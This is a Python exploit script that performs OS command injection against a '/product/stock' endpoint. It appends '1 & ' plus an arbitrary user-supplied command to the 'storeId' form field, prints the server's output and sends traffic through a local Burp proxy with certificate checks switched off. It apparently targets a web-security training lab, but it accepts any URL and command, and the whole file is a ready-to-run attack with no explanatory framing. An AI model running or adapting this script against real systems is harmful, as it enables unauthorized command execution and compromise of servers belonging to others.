import urllib3
import requests
import sys


# Disable Insecure Request warning
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Burp proxy
proxies = {"http": "http://localhost:8080", "https": "http://localhost:8080"}


def run_command(url, command):
    """Run command."""
    stock_path = "/product/stock"
    command_injection = "1 & " + command
    params = {"productId": "1", "storeId": command_injection}

    r = requests.post(url + stock_path, data=params, verify=False, proxies=proxies)

    if len(r.text) > 3:
        print("(+) Command injection successful!")
        print("(+) Output of command: " + r.text)
    else:
        print("(-) Command injection unsuccessful.")


def main():
    """Get provided parameters and run command injection exploit."""
    if len(sys.argv) != 3:
        print("(+) Usage: %s <url> <command>" % sys.argv[0])
        print("(+) Example: %s www.example.com \"whoami\"" % sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1]
    command = sys.argv[2]
    print("(+) Exploiting command injection...")
    run_command(url, command)


if __name__ == "__main__":
    main()
